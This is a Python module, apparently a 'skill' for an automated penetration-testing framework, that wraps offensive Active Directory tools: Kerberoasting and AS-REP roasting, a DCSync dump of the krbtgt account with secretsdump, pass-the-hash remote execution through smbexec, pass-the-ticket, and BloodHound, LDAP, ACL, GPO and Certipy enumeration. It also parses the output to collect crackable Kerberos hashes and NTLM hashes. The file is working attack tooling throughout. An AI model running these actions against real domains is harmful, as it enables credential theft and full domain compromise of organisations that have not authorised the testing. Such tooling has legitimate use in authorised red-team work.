"""AD - Active Directory Attack & Enumeration Skill."""

import asyncio
import shutil
import time
from typing import Any

import structlog

from t100ai.skills.base import BaseSkill, RiskLevel, SkillResult

logger = structlog.get_logger()


class AdSkill(BaseSkill):
    """Skill de Active Directory — enumeración, ataque y post-explotación AD."""

    name = "ad"
    description = "Active Directory enumeration and exploitation"
    category = "ad"
    risk_level = RiskLevel.INTRUSIVE

    def __init__(self):
        super().__init__()
        self.tools = [
            "ad.bloodhound_collect",
            "ad.kerberoast",
            "ad.asrep_roast",
            "ad.ldap_enum",
            "ad.certipy_check",
            "ad.dcsync",
            "ad.pass_the_hash",
            "ad.pass_the_ticket",
            "ad.enumerate_users",
            "ad.enumerate_groups",
            "ad.enumerate_computers",
            "ad.gpo_enum",
            "ad.acl_enum",
        ]

    def get_available_actions(self) -> list[str]:
        """Return list of available AD actions."""
        return [
            "bloodhound_collect",
            "kerberoast",
            "asrep_roast",
            "ldap_enum",
            "certipy_check",
            "dcsync",
            "pass_the_hash",
            "pass_the_ticket",
            "enumerate_users",
            "enumerate_groups",
            "enumerate_computers",
            "gpo_enum",
            "acl_enum",
        ]

    async def validate_params(self, action: str, params: dict[str, Any]) -> bool:
        """Validate parameters for a given AD action."""
        if action in ("bloodhound_collect", "kerberoast", "asrep_roast", "ldap_enum",
                      "dcsync", "pass_the_hash", "pass_the_ticket", "enumerate_users",
                      "enumerate_groups", "enumerate_computers", "gpo_enum", "acl_enum"):
            return "domain" in params and "user" in params and "password" in params
        if action == "certipy_check":
            return "domain" in params and "target" in params
        return True

    async def execute(self, action: str, params: dict[str, Any]) -> "SkillResult":
        """Execute an AD action with given parameters."""
        start_time = time.time()

        match action:
            case "bloodhound_collect":
                return await self._bloodhound_collect(params, start_time)
            case "kerberoast":
                return await self._kerberoast(params, start_time)
            case "asrep_roast":
                return await self._asrep_roast(params, start_time)
            case "ldap_enum":
                return await self._ldap_enum(params, start_time)
            case "certipy_check":
                return await self._certipy_check(params, start_time)
            case "dcsync":
                return await self._dcsync(params, start_time)
            case "pass_the_hash":
                return await self._pass_the_hash(params, start_time)
            case "pass_the_ticket":
                return await self._pass_the_ticket(params, start_time)
            case "enumerate_users":
                return await self._enumerate_users(params, start_time)
            case "enumerate_groups":
                return await self._enumerate_groups(params, start_time)
            case "enumerate_computers":
                return await self._enumerate_computers(params, start_time)
            case "gpo_enum":
                return await self._gpo_enum(params, start_time)
            case "acl_enum":
                return await self._acl_enum(params, start_time)
            case _:
                return SkillResult(success=False, error=f"Acción desconocida: {action}")

    # ── BloodHound ────────────────────────────────────────────────────────

    async def _bloodhound_collect(self, params: dict, start: float) -> SkillResult:
        domain = params["domain"]
        user = params["user"]
        password = params["password"]
        dc = params.get("dc", domain)

        if shutil.which("bloodhound-python"):
            cmd = [
                "bloodhound-python", "-d", domain, "-u", user, "-p", password,
                "-c", "All", "-dc", dc, "-ns", params.get("nameserver", dc),
                "-no-pass" if not password else "",
            ]
            cmd = [c for c in cmd if c]
            return await self._run_ad_tool(cmd, "bloodhound", start, params)

        return SkillResult(
            success=False,
            error="bloodhound-python no instalado. pip install bloodhound",
            execution_time=time.time() - start,
        )

    # ── Kerberoasting ─────────────────────────────────────────────────────

    async def _kerberoast(self, params: dict, start: float) -> SkillResult:
        domain = params["domain"]
        user = params["user"]
        password = params.get("password", "")

        if shutil.which("GetUserSPNs.py"):
            cmd = [
                "GetUserSPNs.py", f"{domain}/{user}:{password}",
                "-dc-ip", params.get("dc", domain),
                "-request",
            ]
            return await self._run_ad_tool(cmd, "kerberoast", start, params)

        return SkillResult(
            success=False,
            error="GetUserSPNs.py (impacket) no instalado",
            execution_time=time.time() - start,
        )

    # ── AS-REP Roasting ───────────────────────────────────────────────────

    async def _asrep_roast(self, params: dict, start: float) -> SkillResult:
        domain = params["domain"]
        user = params.get("target_user", params["user"])
        password = params.get("password", "")

        if shutil.which("GetNPUsers.py"):
            cmd = [
                "GetNPUsers.py", f"{domain}/{user}:{password}",
                "-dc-ip", params.get("dc", domain),
                "-request",
            ]
            return await self._run_ad_tool(cmd, "asrep_roast", start, params)

        return SkillResult(
            success=False,
            error="GetNPUsers.py (impacket) no instalado",
            execution_time=time.time() - start,
        )

    # ── LDAP Enumeration ──────────────────────────────────────────────────

    async def _ldap_enum(self, params: dict, start: float) -> SkillResult:
        domain = params["domain"]
        user = params["user"]
        password = params["password"]
        dc = params.get("dc", domain)
        ldap_url = f"ldap://{dc}"

        if shutil.which("ldapsearch"):
            cmd = [
                "ldapsearch", "-H", ldap_url, "-D", f"{user}@{domain}",
                "-w", password, "-b", f"DC={domain.replace('.', ',DC=')}",
                "(objectClass=*)",
            ]
            return await self._run_ad_tool(cmd, "ldap_enum", start, params)

        if shutil.which("windapsearch"):
            cmd = [
                "windapsearch", "--dc", dc, "-d", domain,
                "-u", user, "-p", password, "-m", "all",
            ]
            return await self._run_ad_tool(cmd, "ldap_enum", start, params)

        return SkillResult(
            success=False,
            error="Ni ldapsearch ni windapsearch instalados",
            execution_time=time.time() - start,
        )

    # ── Certipy ───────────────────────────────────────────────────────────

    async def _certipy_check(self, params: dict, start: float) -> SkillResult:
        domain = params["domain"]
        user = params["user"]
        password = params["password"]
        target = params.get("target", params.get("dc", domain))

        if shutil.which("certipy"):
            cmd = [
                "certipy", "find", "-u", f"{user}@{domain}",
                "-p", password, "-dc-ip", target,
                "-stdout",
            ]
            return await self._run_ad_tool(cmd, "certipy", start, params)

        return SkillResult(
            success=False,
            error="certipy no instalado. pip install certipy-ad",
            execution_time=time.time() - start,
        )

    # ── DCSync ────────────────────────────────────────────────────────────

    async def _dcsync(self, params: dict, start: float) -> SkillResult:
        domain = params["domain"]
        user = params["user"]
        password = params["password"]
        dc = params.get("dc", domain)
        target_user = params.get("target_user", "krbtgt")

        if shutil.which("secretsdump.py"):
            cmd = [
                "secretsdump.py", f"{domain}/{user}:{password}@{dc}",
                "-just-dc-user", target_user,
            ]
            return await self._run_ad_tool(cmd, "dcsync", start, params)

        return SkillResult(
            success=False,
            error="secretsdump.py (impacket) no instalado",
            execution_time=time.time() - start,
        )

    # ── Pass-the-Hash ─────────────────────────────────────────────────────

    async def _pass_the_hash(self, params: dict, start: float) -> SkillResult:
        domain = params["domain"]
        user = params["user"]
        ntlm_hash = params.get("ntlm_hash", params.get("hash", ""))
        target = params.get("target", params.get("dc", domain))

        if not ntlm_hash:
            return SkillResult(
                success=False,
                error="NTLM hash requerido (ntlm_hash param)",
                execution_time=time.time() - start,
            )

        if shutil.which("smbexec.py"):
            cmd = [
                "smbexec.py", "-hashes", f":{ntlm_hash}",
                f"{domain}/{user}@{target}",
            ]
            return await self._run_ad_tool(cmd, "pth", start, params)

        return SkillResult(
            success=False,
            error="smbexec.py (impacket) no instalado",
            execution_time=time.time() - start,
        )

    # ── Pass-the-Ticket ───────────────────────────────────────────────────

    async def _pass_the_ticket(self, params: dict, start: float) -> SkillResult:
        ticket_path = params.get("ticket_path", "")
        if not ticket_path:
            return SkillResult(
                success=False,
                error="ticket_path requerido",
                execution_time=time.time() - start,
            )

        cmds = []
        if shutil.which("export KRB5CCNAME"):
            cmds.append(f"export KRB5CCNAME={ticket_path}")
        if shutil.which("klist"):
            cmds.append("klist")

        if cmds:
            try:
                proc = await asyncio.create_subprocess_shell(
                    " && ".join(cmds),
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await proc.communicate()
                output = stdout.decode() + stderr.decode()
                findings = [{"type": "ticket_loaded", "path": ticket_path}]
                return SkillResult(
                    success=proc.returncode == 0,
                    output=output,
                    findings=findings,
                    execution_time=time.time() - start,
                )
            except Exception as e:
                return SkillResult(
                    success=False,
                    error=str(e),
                    execution_time=time.time() - start,
                )

        return SkillResult(
            success=False,
            error="Kerberos tools no disponibles",
            execution_time=time.time() - start,
        )

    # ── Enumeration ───────────────────────────────────────────────────────

    async def _enumerate_users(self, params: dict, start: float) -> SkillResult:
        domain = params["domain"]
        user = params["user"]
        password = params["password"]
        dc = params.get("dc", domain)

        if shutil.which("rpcdump.py"):
            cmd = [
                "rpcdump.py", f"{domain}/{user}:{password}@{dc}",
            ]
            return await self._run_ad_tool(cmd, "enum_users", start, params)

        if shutil.which("ldapsearch"):
            base = f"DC={domain.replace('.', ',DC=')}"
            cmd = [
                "ldapsearch", "-H", f"ldap://{dc}",
                "-D", f"{user}@{domain}", "-w", password,
                "-b", base, "(objectClass=user)", "sAMAccountName",
            ]
            return await self._run_ad_tool(cmd, "enum_users", start, params)

        return SkillResult(
            success=False,
            error="Herramientas de enumeración AD no disponibles",
            execution_time=time.time() - start,
        )

    async def _enumerate_groups(self, params: dict, start: float) -> SkillResult:
        domain = params["domain"]
        user = params["user"]
        password = params["password"]
        dc = params.get("dc", domain)

        if shutil.which("ldapsearch"):
            base = f"DC={domain.replace('.', ',DC=')}"
            cmd = [
                "ldapsearch", "-H", f"ldap://{dc}",
                "-D", f"{user}@{domain}", "-w", password,
                "-b", base, "(objectClass=group)", "cn", "member",
            ]
            return await self._run_ad_tool(cmd, "enum_groups", start, params)

        return SkillResult(
            success=False,
            error="ldapsearch no instalado",
            execution_time=time.time() - start,
        )

    async def _enumerate_computers(self, params: dict, start: float) -> SkillResult:
        domain = params["domain"]
        user = params["user"]
        password = params["password"]
        dc = params.get("dc", domain)

        if shutil.which("ldapsearch"):
            base = f"DC={domain.replace('.', ',DC=')}"
            cmd = [
                "ldapsearch", "-H", f"ldap://{dc}",
                "-D", f"{user}@{domain}", "-w", password,
                "-b", base, "(objectClass=computer)", "cn", "dNSHostName", "operatingSystem",
            ]
            return await self._run_ad_tool(cmd, "enum_computers", start, params)

        return SkillResult(
            success=False,
            error="ldapsearch no instalado",
            execution_time=time.time() - start,
        )

    async def _gpo_enum(self, params: dict, start: float) -> SkillResult:
        domain = params["domain"]
        user = params["user"]
        password = params["password"]
        dc = params.get("dc", domain)

        if shutil.which("ldapsearch"):
            base = f"DC={domain.replace('.', ',DC=')}"
            cmd = [
                "ldapsearch", "-H", f"ldap://{dc}",
                "-D", f"{user}@{domain}", "-w", password,
                "-b", f"CN=Policies,CN=System,{base}",
                "(objectClass=groupPolicyContainer)", "displayName", "gPCFileSysPath",
            ]
            return await self._run_ad_tool(cmd, "gpo_enum", start, params)

        return SkillResult(
            success=False,
            error="ldapsearch no instalado",
            execution_time=time.time() - start,
        )

    async def _acl_enum(self, params: dict, start: float) -> SkillResult:
        domain = params["domain"]
        user = params["user"]
        password = params["password"]
        dc = params.get("dc", domain)

        if shutil.which("aclpwn.py"):
            cmd = [
                "aclpwn.py", "-d", domain, "-u", user, "-p", password,
                "--server", dc, "--dry",
            ]
            return await self._run_ad_tool(cmd, "acl_enum", start, params)

        if shutil.which("bloodhound-python"):
            cmd = [
                "bloodhound-python", "-d", domain, "-u", user,
                "-p", password, "-c", "ACL", "-dc", dc,
                "-no-pass" if not password else "",
            ]
            cmd = [c for c in cmd if c]
            return await self._run_ad_tool(cmd, "acl_enum", start, params)

        return SkillResult(
            success=False,
            error="aclpwn.py o bloodhound-python no instalado",
            execution_time=time.time() - start,
        )

    # ── Helper ────────────────────────────────────────────────────────────

    async def _run_ad_tool(
        self, cmd: list[str], action: str, start: float, params: dict
    ) -> SkillResult:
        """Ejecuta una herramienta AD de forma async."""
        logger.info("Running AD tool", tool=cmd[0], action=action, domain=params.get("domain"))

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()
            output = stdout.decode(errors="replace") + stderr.decode(errors="replace")

            findings = self._parse_ad_output(output, action, params)

            return SkillResult(
                success=proc.returncode == 0,
                output=output,
                findings=findings,
                execution_time=time.time() - start,
            )
        except FileNotFoundError:
            return SkillResult(
                success=False,
                error=f"{cmd[0]} no instalado",
                execution_time=time.time() - start,
            )
        except asyncio.TimeoutError:
            return SkillResult(
                success=False,
                error=f"Timeout en {action}",
                execution_time=time.time() - start,
            )
        except Exception as e:
            return SkillResult(
                success=False,
                error=str(e),
                execution_time=time.time() - start,
            )

    def _parse_ad_output(self, output: str, action: str, params: dict[str, Any]) -> list[dict[str, Any]]:
        """Parsea output de herramientas AD y extrae hallazgos."""
        findings = []

        if action in ("kerberoast", "asrep_roast"):
            for line in output.splitlines():
                if "$krb" in line or "$krb5tgs" in line or "$krb5asrep" in line:
                    findings.append({
                        "type": "crackable_hash",
                        "action": action,
                        "hash": line.strip(),
                        "severity": "HIGH",
                    })

        elif action == "bloodhound":
            if "INFO: Done" in output or "Collected" in output:
                findings.append({
                    "type": "bloodhound_complete",
                    "message": "BloodHound data collected successfully",
                    "severity": "INFO",
                })

        elif action in ("ldap_enum", "enum_users", "enum_groups", "enum_computers"):
            count = 0
            for line in output.splitlines():
                if "sAMAccountName:" in line or "cn:" in line or "dNSHostName:" in line:
                    count += 1
                    findings.append({
                        "type": "ad_object",
                        "value": line.split(":", 1)[1].strip() if ":" in line else line.strip(),
                        "severity": "INFO",
                    })
            if count > 0:
                findings.insert(0, {
                    "type": "enum_summary",
                    "count": count,
                    "severity": "INFO",
                })

        elif action == "certipy":
            for line in output.splitlines():
                if "VULNERABLE" in line or "ESC" in line:
                    findings.append({
                        "type": "adcs_vulnerability",
                        "value": line.strip(),
                        "severity": "CRIT",
                    })

        elif action == "dcsync":
            for line in output.splitlines():
                if ":" in line and len(line.split(":")) >= 3:
                    parts = line.split(":")
                    if len(parts[1].strip()) == 32:
                        findings.append({
                            "type": "ntds_hash",
                            "user": parts[0].strip(),
                            "ntlm": parts[2].strip()[:32],
                            "severity": "CRIT",
                        })

        return findings if findings else [{"type": action, "value": "No findings extracted", "severity": "INFO"}]
